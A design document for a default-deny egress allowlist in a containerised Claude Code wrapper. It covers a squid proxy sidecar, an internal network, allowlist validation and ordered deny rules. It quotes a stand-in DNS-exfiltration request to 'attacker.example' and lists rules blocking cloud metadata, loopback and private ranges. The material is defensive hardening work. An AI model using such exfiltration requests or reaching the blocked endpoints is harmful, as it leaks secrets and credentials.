## Context

Issue #75 asks for default-deny egress. The constraints:

- No new capabilities in the agent container. `CapBnd` stays `0xc5` and the
  smoke assertion stays as it is, so the boundary cannot be an in-container
  firewall.
- The `--gh` auth-proxy sidecar already gives us a lifecycle to copy: a
  per-session network, trap-before-create teardown, a stopped-only prune,
  `run -d` without `--rm`, exited-sidecar detection, and a host-generated
  config mounted `:ro`.
- `run.sh` has no config-file parser, and the repo's stance is that the env
  var is the knob.

## Decisions

### Opt-in flag, not default (first iteration)

`--egress-allowlist` turns it on. Default-on would break every session that
reaches a host we have not listed: npm/PyPI installs, `tfenv install`, Go
modules, and whatever Claude Code itself contacts beyond the API. The base host
set could not be confirmed empirically in CI, because CI has no Claude
credentials. We make the flag the default once real sessions have confirmed
that set.

### The network enforces; the proxy only applies the list

The agent container's only network is `claude-egress-<id>`, created with
`--internal`, so it has no gateway. The squid sidecar `claude-egress-proxy-<id>`
starts on a normal per-session network `claude-egress-out-<id>` and is then
connected to the internal one. We use a dedicated outbound network rather than
the engine's default network for two reasons: rootless podman's default
(pasta) cannot be multi-attached, and a dedicated network keeps other
containers on the default bridge away from the proxy port.

The agent gets `http_proxy`, `https_proxy`, `HTTP_PROXY` and `HTTPS_PROXY`,
all set to `http://<squid-ip>:3128`, plus `no_proxy`/`NO_PROXY` set to
`localhost,127.0.0.1,::1`. The proxy is addressed by IP, not name, the same way
`--gh` addresses its sidecar. A client that ignores these variables has no
route out and fails.

**DNS.** The agent never needs external DNS, because squid resolves names on
its behalf. On an internal network, Docker's embedded resolver does not
forward external queries (moby ≥ 26), so DNS tunnelling is closed as well.
The smoke cell asserts this (`getent hosts example.org` fails) rather than
assuming it.

### Squid, installed into the agent image. No new image, no new pin.

Caddy, which the `--gh` sidecar uses, cannot do this. Its forward proxy is a
third-party plugin that is not in the official image, and generalising the
reverse proxy would mean MITMing every allowed host. Squid's `CONNECT` keeps
TLS end-to-end. There is no first-party squid image on Docker Hub, so we had
two candidates: Canonical's `ubuntu/squid`, digest-pinned, or `apt-get install
squid` into the image we already build and run `$IMAGE` as the sidecar with
`--entrypoint /usr/sbin/squid`. We chose the second:

- It is supply-chain minimal. The bytes come from the Ubuntu archive we
  already trust for the base image, and Trivy scans them with the rest of the
  image.
- It adds no pull. The image is already local.
- It handles the version question. The README keeps Caddy out of `pins/`
  because an upgrade can change the semantics of the security-critical config
  we generate. Squid from the archive only moves within an Ubuntu release
  (security/bugfix SRUs). A major version change only happens when the `FROM`
  line changes, which is already a reviewed, separate change. Pinning an exact
  apt version would break the build every time the archive drops the old
  point release (`.hadolint.yaml` DL3008 rationale). So there is nothing for
  `pins/` / `update_pins.py` to track.
- The cost is image size (~15 MB), plus a squid binary present, and inert, in
  the agent container.

The sidecar runs with `--user proxy --cap-drop ALL --security-opt
no-new-privileges`. It listens on 3128 (> 1024), so it needs no capabilities.
It holds no secret.

### Allowlist sources and format

The effective list is the union of four sources:

1. **Base.** `api.anthropic.com`, `claude.ai`, `platform.claude.com`,
   `console.anthropic.com`: the API plus the OAuth login and refresh hosts.
   Telemetry and update hosts are deliberately left out, because the image
   sets `DISABLE_AUTOUPDATER=1` and telemetry failing is harmless.
2. **Effective endpoint.** Under `--api` (#87), when `ANTHROPIC_BASE_URL` is
   set on the host, its hostname is added: that is the gateway the session will
   actually call. Without `--api` the variable is not forwarded, so it adds
   nothing. Otherwise an `--api` session would fail closed at the first
   request. The value is host-supplied, so it is trusted.
3. **Opt-in implied hosts.** Each is added only when its flag is passed:
   - `--gh` / `--gh-direct`: `github.com`, `api.github.com`,
     `uploads.github.com`, `codeload.github.com`, `raw.githubusercontent.com`,
     `objects.githubusercontent.com`, `release-assets.githubusercontent.com`.
   - `--glab`: `gitlab.com`.
   - `--tfe`: `app.terraform.io`.
   - `--aws`: `.amazonaws.com`. This is broad: it includes every S3 bucket,
     which is an exfiltration channel. AWS gives no narrower name that covers
     STS, SSO-OIDC and regional service endpoints. docs/security.md states
     the trade-off.
   - `--az`: `.dev.azure.com` (the org host plus its `vssps` / `vsrm` /
     `feeds` service hosts), `.visualstudio.com` (legacy org URLs), and the
     hostname of `AZURE_DEVOPS_ORG_URL` when set, the same way as
     `ANTHROPIC_BASE_URL`, so an on-prem Server works.
   - `--registry` adds nothing automatically. Its hosts live in
     npmrc/pip.conf/uv.toml, and parsing those is out of scope. The user
     lists the feed host.
4. **`CLAUDE_DOCKER_EGRESS_ALLOW`.** Entries are separated by whitespace or
   commas, and each entry is one of:
   - `host.example.com`: exactly that host;
   - `.example.com`: the domain and every subdomain (squid `dstdomain`
     semantics);
   - `10.20.0.0/16` or `10.20.1.5`: an IPv4 address or CIDR, which is allowed
     as a destination. This is the only way to reach a private range.

   The variable is the knob, and the shell rc makes it sticky, per
   `add-container-runtime-selection`.

**Validation.** Every entry, from any source (including the hostname taken
from `ANTHROPIC_BASE_URL`), goes through one shell validator before it reaches
`squid.conf`:

- Hostnames must match `^\.?([A-Za-z0-9-]+\.)*[A-Za-z0-9-]+$` and be at most
  253 characters.
- IPv4/CIDR entries must match `^[0-9]{1,3}(\.[0-9]{1,3}){3}(/[0-9]{1,2})?$`.

Anything else aborts startup and names the entry. We abort rather than skip
because a silently dropped entry looks like a working boundary. The validator
is config-injection defence: squid never receives whitespace, quotes or
newlines from any input.

**No repo-supplied list in this iteration.** A `.claude-docker/allowed-hosts`
file lives inside the untrusted repo. Reading it naively lets any cloned repo
grant itself egress. Doing it safely needs a host-side approval store, keyed
by content hash, plus a prompt, and that needs a design of its own. Taking
only host-side input keeps the attack surface at zero for now.

### Denies above the allowlist

The generated `http_access` rules, in this order:

1. deny `dstdomain metadata.google.internal metadata.azure.internal`;
2. deny ports other than 80/443, and `CONNECT` to anything but 443;
3. **deny any hostname that is not on the allowlist, unless the request is an
   IP literal.** This is a name-only check (`dstdomain -n`, `dstdom_regex -n`)
   and it comes before every `dst` ACL. A `dst` ACL makes squid resolve the
   name, so without this rule `CONNECT <secret>.attacker.example:443` would
   leak `<secret>` to the attacker's DNS server even though the request is
   then denied;
4. deny metadata and link-local: `dst 169.254.0.0/16 fe80::/10`;
5. deny loopback / unspecified: `dst 127.0.0.0/8 0.0.0.0/8 ::1`;
6. allow `dst` entries from the user CIDRs, plus the `--gh` sidecar's /32;
7. deny private ranges: `dst 10.0.0.0/8 172.16.0.0/12 192.168.0.0/16
   100.64.0.0/10 fc00::/7`;
8. allow `dstdomain -n <allowlist>`;
9. deny all.

After rule 3, the only names squid resolves are allowlisted ones. The `dst`
ACLs are evaluated against the address squid resolved, which makes rules 5
and 7 the DNS-rebinding defence: an allowlisted name that resolves inward is
refused. Rule 6 comes after rules 4 and 5, so no user entry can re-open
metadata or loopback. The `-n` on `dstdomain` stops a PTR record from making
an IP-literal request match an allowed name.

**RFC1918 policy (explicit).** Private ranges are denied by default. The
alternative, allowing them by default, would re-open rebinding for every
allowed name. Corporate gateways and registries (e.g. an `--api` LiteLLM on
`10.x`) need an explicit CIDR entry. That is one line, it is visible in the
user's own config, and it stays host-side.

### Composition with `--gh`

When both `--gh` (sidecar active) and `--egress-allowlist` are passed:

- The gh sidecar keeps its own outbound network `claude-gh-<id>` and is
  additionally connected to `claude-egress-<id>`.
- The agent's `--add-host` entries for the three hostnames use the gh
  sidecar's address on the egress network, and the agent is not attached to
  `claude-gh-<id>`.
- Squid receives the same three `--add-host` entries. Its `hosts_file` is
  `/etc/hosts`, so `CONNECT github.com:443` goes to the gh sidecar, which
  terminates TLS with the session CA and injects the token as it does today.
  The sidecar's /32 is in the rule (4) allow set, so the private deny does not
  catch it.
- We deliberately do not use `NO_PROXY` for GitHub: `no_proxy=github.com`
  also matches `codeload.github.com` in curl and Go, and a direct connection
  from the agent has no route.

This settles the #12 question for now as "per-provider sidecars, one egress
proxy". The egress proxy only routes; credentials stay in their own sidecars.

### What "deny" looks like

- HTTPS: `CONNECT` is answered `403`, e.g. curl reports `CONNECT tunnel
  failed, response 403`. Plain HTTP gets squid's standard access-denied page,
  which names the URL.
- At startup, `run.sh` prints the sidecar name and the effective allowlist to
  stderr.
- At session end, the EXIT trap reads squid's access log (stdout) and prints
  `claude-docker: egress allowlist blocked: <host> <host> … — add them to
  CLAUDE_DOCKER_EGRESS_ALLOW to permit them`. This is how the user finds out
  what to add without reading logs. During the session, `docker logs
  <sidecar>` shows the same entries.

### Lifecycle

This mirrors `--gh`. Resource names derive from the stage-dir suffix, and the
EXIT trap, installed before anything is created, removes the proxy container
and then both networks (after the gh sidecar, which may be attached to the
internal one). The stopped-only prune also covers `claude-egress-proxy-*`
containers and `claude-egress-*` networks.

Startup is fail-closed:

- network creation fails → abort;
- `run -d` fails → abort;
- the proxy exits during startup → abort, printing squid's last log lines;
- no `Accepting HTTP Socket connections` within 15s → abort;
- no proxy IP → abort.

On any of these the agent container is never started.

## Risks / Trade-offs

- **Friction.** Any host we have not listed fails. Mitigated by the opt-in,
  the end-of-session summary, and the docs listing the common runtime
  code-fetch hosts to add (npm, PyPI, HashiCorp, Go proxy).
- **Node's built-in `fetch` ignores proxy variables.** Scripts that use it
  fail closed. Claude Code, npm, pip, uv, git, curl and Go all honour them.
- **`.amazonaws.com` breadth under `--aws`.** Discussed above.
- **Docker < 26** forwarded external DNS from internal networks. The smoke
  assertion catches that on CI's engine. Users on older engines keep a DNS
  side channel, which is documented.
- **Podman** is untested. `--internal` and `network connect` exist there, but
  CI does not run podman.

## Open follow-ups

- Confirm empirically the hosts a real Claude Code session contacts under the
  pinned version, then consider default-on.
- A repo-proposed allowlist with host-side, hash-keyed approval.
- A podman CI cell.
